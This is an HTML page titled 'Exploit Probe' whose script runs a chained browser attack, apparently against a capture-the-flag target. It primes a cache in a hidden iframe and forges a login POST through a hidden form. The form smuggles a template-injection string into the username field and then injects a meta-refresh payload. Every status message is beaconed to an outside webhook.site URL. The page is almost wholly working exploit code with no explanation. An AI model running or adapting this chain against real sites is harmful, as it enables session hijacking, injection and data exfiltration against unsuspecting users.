<!DOCTYPE html>
<html>
<head>
    <title>Exploit Probe</title>
</head>
<body>
    <h1>Exploiting...</h1>
    <div id="log"></div>
    <script>
        const WEB_URL = "http://web:11202";
        const WEBHOOK = "https://webhook.site/8e7ccc1c-b998-40ff-bc7f-14c432def363";

        // Probe Payload: Meta Refresh
        // If this triggers, we know cache+CSRF worked and we have HTML injection.
        const PROBE_PAYLOAD = `<meta http-equiv="refresh" content="0;url=${WEBHOOK}?probe=success">`;
        
        const log = (msg) => {
            document.getElementById('log').innerText += msg + '\n';
            new Image().src = `${WEBHOOK}?log=${encodeURIComponent(msg)}`;
        };

        async function run() {
            log('Starting Probe...');

            // 1. Prime Cache
            log('1. Priming cache...');
            const cacheFrame = document.createElement('iframe');
            cacheFrame.src = WEB_URL + '/';
            cacheFrame.style.display = 'none';
            document.body.appendChild(cacheFrame);
            
            await new Promise((resolve) => {
                cacheFrame.onload = resolve;
                // Fallback for Mixed Content blocking onload?
                setTimeout(resolve, 2000);
            });
            log('Cache primed?');

            // 2. Login CSRF
            log('2. Login CSRF...');
            
            const loginFrame = document.createElement('iframe');
            loginFrame.name = 'loginFrame';
            loginFrame.style.display = 'none';
            document.body.appendChild(loginFrame);
            
            let loadCount = 0;
            loginFrame.onload = () => {
                loadCount++;
                if (loadCount === 1) {
                    log('3. Triggering XSS...');
                    const targetUrl = WEB_URL + '/?x=' + encodeURIComponent(PROBE_PAYLOAD);
                    loginFrame.src = targetUrl;
                }
            };
            
            const form = document.createElement('form');
            form.action = WEB_URL + '/login';
            form.method = 'POST';
            form.target = 'loginFrame';
            
            const u = document.createElement('input');
            u.type = 'hidden';
            u.name = 'username';
            u.value = '{request.query_params[x]}'; 
            form.appendChild(u);
            
            const p = document.createElement('input');
            p.type = 'hidden';
            p.name = 'password';
            p.value = 'password123';
            form.appendChild(p);
            
            document.body.appendChild(form);
            form.submit();
        }
        
        run();
    </script>
</body>
</html>
